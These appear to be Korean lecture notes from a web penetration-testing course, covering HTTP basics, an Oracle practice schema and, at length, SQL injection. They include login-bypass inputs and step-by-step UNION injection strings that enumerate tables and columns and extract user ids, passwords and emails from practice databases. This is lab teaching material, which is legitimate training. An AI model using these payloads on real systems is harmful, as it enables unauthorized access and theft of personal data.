@@ -1,0 +1,639 @@
+* 1일차 메모
+
+http://useworld.ddns.net
+
+https://lms.eqst.co.kr
+
+1. BurpSuite
+2. Oracle DB 24 AI 
+  구글 - Oracle Db download -> windows용 다운로드
+  윈도우 사용자 계정이 한글이면 X
+
+3. SQL Developer 
+  구글 - SQL Developer download
+
+4. Python
+5. VSCode
+
+6. D2Coding font 
+   나눔고딕코딩
+
+0Oo1lI
+
+
+naver.com/ -> index.html
+
+<html>
+
+<head>
+ <title>네이버</title>
+ <script src="test.js"></script>  -> naver.com/test.js
+ <link src="test.css"></link> -> naver.com/test.js 
+</head>
+
+ 
+<body>
+<img src="test.jpg"> -> naver.com/test.jpg
+<img src="test2.jpg"> -> naver.com/test2.jpg
+
+</body>
+
+</html>
+
+
+[      ] 검색 
+
+맛집
+날씨 
+
+
+취약점 진단 vs 모의해킹
+체크리스트     실제로 공격
+                Blackbox > Whitebox
+                Pentest
+                시나리오 기반 모의해킹
+
+모바일 테더링
+
+>= 
+
+>
+=
+
+한글 윈도우    ->         일본 윈도우
+
+안녕 반가워    ->         지러지바거히ㅏㅓㅏㅣㅓ지ㅏ허ㅏㅣ
+
+    인코딩
+
+asldfkjwea/+lkjlekwaj==  ->  Base64  지러지바거히ㅏㅓㅏㅣㅓ지ㅏ허ㅏㅣ
+%32%23%235j%23PIO5J      ->  URL Encode
+
+안녕 반가워          <-  asldfkjwealkjlekwaj==
+
+GET https://search.naver.com/search.naver?query=나&너 HTTP/1.2
+
+query <- 나
+너    <- ?
+
+
+bank.com -> 작업
+
+X
+
+hacker.com -> js 가지고와서 실행시켜
+
+
+www.bank.com 
+
+     |
+     |
+     |
+
+OPTIONS api.bank.com
+
+allow-accses : *
+
+api.bank.com 
+
+
+* Query 방식
+a=&b=2&c=3 
+
+* XML 방식
+<a> 
+    <이름>
+     홍길동
+    </이름>
+    <나이>
+    18
+    </나이>
+ </a>
+ <b>  2</b><c>  3 </c>
+
+* JSON 방식
+
+{ "a" : {
+        "이름":"lkjkl",
+        "나이":18
+            },
+  "b" : 2,
+  "c" : 3}
+
+
+GET board.com/qna/list
+GET board.com/qna/view?id=3
+GET board.com/qna/delete?id=3
+POST board.com/qna/write 
+title=제목&content=내용
+
+POST board.com/qna/edit?id=3
+title=제목&content=내용
+
+GET board.com/qna/
+GET board.com/qna/3
+DELETE board.com/qna/3
+PUT board.com/qna/
+UPDATE board.com/qna/3
+
+WebDAV <-
+PUT board.com/board/list.html
+<html>
+<....
+</html>
+
+ssh sftp 
+로컬 -> upload
+
+OPTIONS 주소 
+
+* Oracle DB만 설치요!!!!! 
+  오래걸려서 미리 누름
+  중간에 비밀번호 입력한거 기억하셔야 합니다~
+
+  나머진 오후에 같이 진행합니다.
+
+  안되시는 분들
+  1. 옆사람 연결
+  2. Docker로
+  3. SQLFiddle , SQLTest
+
+
+  SPA -> Single Page Application 
+
+-> naver.com <- 메일함, 카페, 검색결과, 뉴스, 게시판 
+주소가 안바뀜 -> Ajax
+
+  프론트엔드 서버
+  www.test.com -> 웹서버 -> 정적인 응답
+
+  3번글 
+
+  https://board.com/qna/view?id=3
+
+  https://board.com/qna/
+
+  https://api.board.com
+  {cmd}
+
+  백엔드 서버(API)
+  api.test.com -> 화면 X 
+
+Req
+  {"cmd":"listqna"}
+
+Res 
+  {"result":"mail", "data": {
+    "글번호":3,
+    "글제목":머
+    "내용":머
+  }, {
+
+  }
+  }
+
+
+계정 만들기 
+
+
+ALTER SESSION SET "_ORACLE_SCRIPT"=true;
+create user test identified by 1234;
+grant connect, resource, dba to test;
+
+
+create user test2 identified by 1234;
+grant connect, resource, dba to test2;
+
+create user test3 identified by 1234;
+grant connect, resource, dba to test3;
+
+
+
+* SQL Injection 
+
+파일명->Database->Schema->SID->DB name
+시트 -> Table name
+A,B,C,D -> Column name
+1,2,3,4 -> Row , Row num
+
+연산
+-> 크다 작다 더하기 빼기 곱하기 나누기
+
+테이블 
+friends 
+컬럼 name age addr hobby 
+age만 숫자형
+나머지는 문자형
+만들어줘
+
+CREATE TABLE friends (
+    name VARCHAR2(10),
+    age NUMBER,
+    addr VARCHAR2(25),
+    hobby VARCHAR2(10)
+);
+
+
+name는 멍멍일	age는 27	addr는 서울 hobby는	야구
+데이터 넣는 쿼리 내놔
+
+
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍일','27','서울','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍이','26','대전','축구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍삼','25','대구','농구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍사','30','부산','농구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍오','22','서울','축구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍육','26','부산','배구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍칠','25','대전','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍팔','30','대구','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍구','22','서울','배구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('멍멍십','26','대전','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹일','25','대구','축구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹이','30','부산','농구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹삼','22','서울','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹사','26','부산','배구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹오','25','대전','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹육','30','대구','축구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹칠','22','서울','축구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹팔','26','대전','축구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹구','24','대구','야구');
+INSERT INTO friends (name, age, addr, hobby) VALUES ('야옹십','23','부산','배구');
+
+select [컬럼명] from [테이블명];
+      * <-
+
+select * from friends;
+
+CREATE TABLE members (
+    name VARCHAR2(10),    
+    id VARCHAR2(25),
+    pw VARCHAR2(10)
+);
+INSERT INTO members (name, id, pw) values ('멍멍일','dog01','test01');
+INSERT INTO members (name, id, pw) values ('멍멍이','dog02','test02');
+INSERT INTO members (name, id, pw) values ('멍멍삼','dog03','test03');
+INSERT INTO members (name, id, pw) values ('멍멍사','dog04','test04');
+INSERT INTO members (name, id, pw) values ('멍멍오','dog05','test05');
+INSERT INTO members (name, id, pw) values ('멍멍육','dog06','test06');
+INSERT INTO members (name, id, pw) values ('멍멍칠','dog07','test07');
+INSERT INTO members (name, id, pw) values ('멍멍팔','dog08','test08');
+INSERT INTO members (name, id, pw) values ('멍멍구','dog09','test09');
+INSERT INTO members (name, id, pw) values ('멍멍십','dog10','test10');
+INSERT INTO members (name, id, pw) values ('야옹일','cat01','test11');
+INSERT INTO members (name, id, pw) values ('야옹이','cat02','test12');
+INSERT INTO members (name, id, pw) values ('야옹삼','cat03','test13');
+INSERT INTO members (name, id, pw) values ('야옹사','cat04','test14');
+INSERT INTO members (name, id, pw) values ('야옹오','cat05','test15');
+INSERT INTO members (name, id, pw) values ('야옹육','cat06','test16');
+INSERT INTO members (name, id, pw) values ('야옹칠','cat07','test17');
+INSERT INTO members (name, id, pw) values ('야옹팔','cat08','test18');
+INSERT INTO members (name, id, pw) values ('야옹구','cat09','test19');
+INSERT INTO members (name, id, pw) values ('야옹십','cat10','test20');
+INSERT INTO members (name, id, pw) values ('관리자','admin','skshieldus');
+
+조회 
+select 
+삽입
+insert
+수정
+update 
+삭제
+delete
+
+select 컬럼1, 컬럼2....
+from 테이블명 
+where 조건
+order by 컬럼 
+
+
+select name, age, addr, hobby from friends where hobby = '야구' and addr = '대구';
+
+select * from friends;
+
+where '야구' = '야구' and '서울' = '대구';
+    ~~~~~~~~~~~~~~~~~      ~~~~~~~~~~~~~~
+              True            False
+              
+              T and F -> F
+
+
+
+* AND   ~ 이고 ~ 도
+
+T and T -> T 
+T and F -> F
+F and T -> F
+F and F -> F
+
+* OR  ~ 이거나 ~ 
+T or T -> T
+T or F -> T 
+F or T -> T 
+F or F -> F
+
+
+where hobby = '야구' or (addr='서울' and age > 25); or and and or......
+
+1 + (2 * 3) = 7
+ or   and 
+
+ TorF orT or or or 
+
+
+
+
+아이디   [  admin' or 'a'='efg     ]
+비밀번호 [  test01 or    ]
+
+           [로그인]
+
+<input type="text" name="id"/>
+<input type="password" name="pw"/>
+
+test.com/login?id=dog01&pw=test01
+
+id입력값 = id
+pw입력값 = pw 
+
+result = select * from members where id = 'admin' or ('1'='lk' and pw = '몰?루')
+                                                        F
+if result없으면:
+    로그인 실패
+else:
+    로그인 성공~!
+
+* 인증 우회 
+
+select * from members where id = 'admin' or 'a'='efg' and pw = '몰?루' or'
+
+select * from members where (pw = '몰?루' and id = 'admin') or 'e'='e'
+
+
+select * from 계정 where id = '아이디' and pw = '비번';
+
+아이디   [  z_answer@eqst2.com ]
+비밀번호 [         1234        ]
+
+                   로그인 
+
+
+select * from 계정 where id = 'z_answer@eqst2.com' 'q'='w  ' and pw = '1234';                   
+
+z_answer@eqst2.com' or 'q'='w
+1234
+
+
+=========================
+* SQL Injection 문제 2번
+=========================
+1. 공격구문
+2. 정답
+
+
+=========================
+* SQL Injection 문제 3번
+=========================
+1. 공격구문
+2. 정답
+
+
+ID [  z_answer@eqsat2.com or ]
+PW [    ]
+
+id=asdf&pw=aef 
+
+result = select 컬럼 from 계정 where id = 'z_answer@eqsat2.com'  or '1'='1' and pw = '1234'
+                                                              
+
+if result없으면:
+   로그인 실패
+else:
+   로그인 성공 
+
+
+select 컬럼 from 계정 where id = 'z_answer@eqst2.com' or p=i' and pw = '비번'
+
+z_answer@eqst2.com' or p=i
+
+* Mysql MSSQL Oracle 
+# --
+f
+
+/**/
+
+아이디 [     ]  id 
+비번   [ 1234    ]   pw 
+
+
+result = select pw from 계정 where id = '아이디' 
+
+if 비번 == result:
+   로그인 성공 
+else: 
+   로그인 실패 
+
+
+* UNION SQL Injection
+
+select 머시기 
+   union
+select 머시기
+
+
+
+ORA-01789: 질의 블록은 부정확한 수의 결과 열을 가지고 있습니다.
+
+https://docs.oracle.com/error-help/db/ora-01789/01789. 00000 -  "query block has incorrect number of result columns"
+*Cause:    All of the queries participating in a set expression do
+           not contain the same number of SELECT list columns.
+*Action:   Check that all the queries in the set expression have
+           the same number of SELECT list columns.
+
+
+
+ORA-01790: 대응하는 식과 같은 데이터 유형이어야 합니다
+
+https://docs.oracle.com/error-help/db/ora-01790/01790. 00000 -  "expression must have same datatype as corresponding expression"
+*Cause:    A SELECT list item corresponds to a SELECT list item
+           with a different datatype in another query of the same set
+           expression.
+*Action:   Check that all corresponding SELECT list items have
+           the same datatypes. Use the TO_NUMBER, TO_CHAR, and TO_DATE
+           functions to do explicit data conversions.
+4행, 13열에서 오류 발생
+
+* UNION 제약 사항 
+1. 컬럼의 개수가 맞아야함
+2. 자료형이 같아야 함 -> 오라클만 깐깐해
+
+
+
+* UNION 공격 순서 
+1. 쿼리문 유추 
+select * from friends where name like '%___검색어___%'
+
+2. 공격 포인트 
+멍%' (공격 포인트)   %'
+
+3. UNION 제약 사항 
+  3-1. 컬럼의 개수 알아내기
+     1) 정렬을 이용
+       검색어 : 멍%' order by 1~아무것도 안나올때까지--
+     2) 막무가내로 합쳐보기
+      null union
+
+      union select null,null,null from dual;
+      검색어 : 멍%' union select null,null,null from dual where 'q%'='q
+      select name, age, addr from friends where name like '%멍%' union
+        select null,null,null from dual where 'q%'='q%';
+  3-2. 자료형 알아내기
+
+select name, age, addr from friends where name like '%멍%' union
+select 'a',1,'b' from dual where 'q%'='q%';
+
+null 에 숫자, 문자 번갈아 집어 넣으면서 에러 안날때까지
+
+
+4. 탈취한 테이블명
+select table_name from all_tables where owner = user;
+select table_name from user_tables;
+5. 탈취할 데이터의 컬럼명
+select column
+6. 실제 개인정보 탈취
+union select 탈취컬럼,... from 탈취테이블
+
+all_tables 
+user_tables
+
+all_tab_columns 
+user_tab_columns
+
+이름  [   멍     ]
+                  [검색]
+
+test.com/search?keyword=멍
+
+
+select 컬럼들.... from 테이블 where 이름 like '%_____검색어_____%'
+
+
+* 목표 : 관리자 비번 털기
+
+1. 쿼리문 유추 
+select * from friends where name like '%___검색어___%'
+
+2. 공격 포인트 
+멍%' (공격 포인트)   %'
+
+3. UNION 제약사항 
+  3-1. 컬럼의 개수 맞추기 : 3개
+     order by 1~에러날때까지 --
+     멍%' (공격 포인트)   %'
+
+     검색어 : 멍%' order by 1 --  
+  
+     select * from friends where name like '%멍%' order by 1
+  3-2. 자료형 맞추기 : 문자, 숫자, 문자
+    select null, null, null from dual 
+
+    union select null, null, null from dual 
+    멍%' (공격 포인트)   
+    멍%' union select null, null, null from dual where 'o%'='o
+
+    검색어 : 멍%' union select null, null, null from dual where 'o%'='o
+
+    select * from friends where name like '%__검색어__%'
+    select * from friends where name like '%멍%' union select null, null, null from dual where 'o%'='o%'
+
+4. 테이블명 탈취 : MEMBERS 
+   select table_name from user_tables 
+   union select null, null, table_name from user_tables where 'p%'='p
+   검색어 : 멍%' union select null, null, table_name from user_tables where 'p%'='p 
+
+   select name, age, hobby from friends where name like '%멍%' union select null, null, table_name from user_tables where 'p%'='p%
+
+5. 컬럼 명 : NAME, ID, PW 
+   select column_name from user_tab_columns where table_name = 'MEMBERS'
+   union select column_name, null, null from user_tab_columns where table_name = 'MEMBERS' where 's%'='s
+
+   검색어 : 멍%' union select column_name, null, null from user_tab_columns where table_name = 'MEMBERS' where 's%'='s
+
+   select name, age, hobby from friends where name like '%검색어%' 
+   select name, age, hobby from friends where name like '%멍%' union select column_name, null, null from user_tab_columns where table_name = 'MEMBERS' where 's%'='s%' 
+
+
+   select name, age, hobby from friends where name like '%멍%' union select column_name, null, null from user_tab_columns where table_name = 'MEMBERS' and 's%'='s%';
+
+6. 데이터 탈취 :
+   select id, null, pw from members
+   union select id,2,pw from members where 'j%'='j  
+   검색어 : 멍%' union select id,2,pw from members where 'j%'='j  
+
+    select name, age, hobby from friends where name like '%검색어%' 
+    select name, age, hobby from friends where name like '%멍%' union select id,2,pw from members where 'j%'='j%' 
+
+
+
+
+1. 쿼리문 유추 
+
+select 컬럼들 from 주소 
+  where 읍/면/동 like '%      %'
+
+2. 공격포인트
+문정동%' (공격쿼리)    -> %'
+
+3. UNION 제약사항 
+ 3-1. 컬럼의 개수 : 5개
+  문정동%' order by 1 --
+  
+  문정동%' union select null,null,null,null,null from dual where 'm%'='m
+
+ 3-2. 자료형 : 전부 문자형
+   문정동%' union select 'a', 'b', 'c' ,'d', 'e' from dual where 'm%'='m
+
+4. 테이블명 탈취 : MEMBER
+  select table_name from user_tables 
+  select table_name,null,null,null,null from user_tables 
+
+  문정동%' union (공격쿼리) where 'm%'='m
+
+  문정동%' union select table_name,null,null,null,null from user_tables  where 'm%'='m
+
+5. MEMBER 테이블의 컬럼명 : user_nm, login_id, pass, email
+select column_name from user_tab_columns where table_name = 'MEMBER'
+
+문정동%' union (공격쿼리) where 'm%'='m
+문정동%' union select column_name,null,null,null,null from user_tab_columns where table_name = 'MEMBER' and 'm%'='m
+
+6. 개인정보 탈취
+ select user_nm, login_id, pass, email from member 
+ select user_nm, login_id, pass, email, null from member 
+ 문정동%' union (공격쿼리) where 'm%'='m
+ 문정동%' union select user_nm, login_id, pass, email, null from member where 'm%'='m
+
+ 
+
+ ============================
+ * SQL Injection 문제 10번
+ ============================
+ 1. 풀이과정 
+ 2. 정답
+ ============================
+
+1. 발생한 위치 -> 주소 
+2. 파라미터 명 
+3. 공격 과정 
+
+4. 대응방안
+
+
+UNION SQL Injection -> 0.1% 
+Error-based SQL Injection -> 0.9%
+Blind SQL Injection -> 99%
+
+MySQL , SQLite -> Union 
+Sub-query 
+엑셀 함수
+Error-based 
+-> Blind 찍먹
